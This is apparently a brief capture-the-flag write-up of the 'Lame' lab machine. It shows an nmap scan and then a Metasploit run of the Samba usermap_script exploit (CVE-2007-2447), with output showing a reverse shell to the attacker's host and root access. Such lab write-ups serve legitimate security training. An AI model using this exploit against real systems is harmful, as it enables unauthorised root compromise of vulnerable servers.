# Lame Write-up

\# BlueBrain

## Enumeration

### Nmap

```
nmap -T4 -A -v 10.10.10.3
```

Nmap reveals vsftpd 2.3.4, OpenSSH and Samba. Vsftpd 2.3.4 does have a built-in backdoor, however it is not exploitable in this instance.

## Exploitation

Exploitation is trivial on this machine. After attempting (and failing) to enter using the “obvious” vsftpd attack vector, Samba becomes the only target. Using CVE-2007-2447, which conveniently has a Metasploit module associated with it, will immediately grant a root shell. The user flag can be obtained from `/home/makis/user.txt` and the root flag from `/root/root.txt`

Module: exploit/multi/samba/usermap_script

```
msf6 exploit(multi/samba/usermap_script) > set rhost 10.10.10.3
rhost => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.16.12:4444 
[*] Command shell session 1 opened (10.10.16.12:4444 -> 10.10.10.3:54003) at 2024-05-26 13:46:04 -0400

whoami 
root
```